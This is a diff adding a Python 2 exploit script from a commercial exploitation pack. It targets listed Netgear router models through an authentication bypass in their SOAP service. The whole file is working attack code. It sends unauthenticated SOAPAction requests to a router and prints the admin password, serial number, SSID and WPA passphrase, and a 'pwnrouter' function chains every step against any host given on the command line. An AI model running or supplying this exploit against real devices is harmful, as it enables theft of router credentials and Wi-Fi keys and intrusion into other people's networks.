@@ -1,0 +1,115 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2015
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+try:
+  from bs4 import BeautifulSoup
+except:
+  print 'No module BeautifulSoup4'
+
+_name_   = 'd2sec_netgear_6.py'
+_vendor_ = 'netgear'
+_model_  = ['WNDR3700v4 - V1.0.0.4SH', 
+  'WNDR3700v4 - V1.0.1.52', 
+  'WNR2200 - V1.0.1.88', 
+  'WNR2500 - V1.0.0.24',
+  'WNDR3700v2 - V1.0.1.14',
+  'WNDR3700v1 - V1.0.16.98',
+  'WNDR3700v1 - V1.0.7.98',
+  'WNDR4300 - V1.0.1.60',
+  'R6300v2 - V1.0.3.8',
+  'WNDR3300 - V1.0.45',
+  'WNDR3800 - V1.0.0.48',
+  'WNR1000v2 - V1.0.1.1',
+  'WNR1000v2 - V1.1.2.58',
+  ]
+_vuln_   = 'Authentication Bypass / Information Disclosure'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def _get_xml_data(host, action):
+  try:
+    content = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/'%host)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.HTTPHEADER, ['SOAPAction: \"%s\"'%action])
+    c.setopt(pycurl.POSTFIELDS, 'd2')
+    c.setopt(pycurl.POST, 1)
+    c.setopt(c.TIMEOUT, 15)
+    c.setopt(pycurl.WRITEFUNCTION, content.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  data = content.getvalue()
+  content.close()
+  return data
+
+def device_info_get_info(host):
+  try:
+    xml = _get_xml_data(host, "urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo")
+    if xml:
+      soap = BeautifulSoup(xml)
+      print '[+] Description: %s'%soap.description.string
+      print '[+] Model Number: %s'%soap.modelname.string
+      print '[+] Serial Number: %s'%soap.serialnumber.string
+      print '[+] Firmware Version: %s'%soap.firmwareversion.string
+  except Exception, e:
+    print '[-] device_info_get_info() error : %s' % e
+  
+def lan_config_security_get_info(host):
+  try:
+    xml = _get_xml_data(host, "urn:NETGEAR-ROUTER:service:LANConfigSecurity:1#GetInfo")
+    if xml:
+      soap = BeautifulSoup(xml)
+      print '[+] Admin Password: %s'%soap.newpassword.string
+  except Exception, e:
+    print '[-] lan_config_security_get_info() error : %s' % e
+
+def wlan_config_get_info(host):
+  try:
+    xml = _get_xml_data(host, "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetInfo")
+    if xml:
+      soap = BeautifulSoup(xml)
+      print '[+] WLAN SSID: %s'%soap.newssid.string
+      print '[+] WLAN Enc: %s'%soap.newbasicencryptionmodes.string
+  except Exception, e:
+    print '[-] wlan_config_get_info() error : %s' % e
+
+def wlan_config_get_wpa_keys(host):
+  try:
+    xml = _get_xml_data(host, "urn:NETGEAR-ROUTER:service:WLANConfiguration:1#GetWPASecurityKeys")
+    if xml:
+      soap = BeautifulSoup(xml)
+      print '[+] WLAN WPA Key: %s'%soap.newwpapassphrase.string
+  except Exception, e:
+    print '[-] wlan_config_get_wpa_keys() error : %s' % e
+
+def pwnrouter(host):
+  actions = [device_info_get_info, 
+    lan_config_security_get_info,
+    wlan_config_get_info,
+    wlan_config_get_wpa_keys,
+  ]
+  for action in actions:
+    action(host)
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
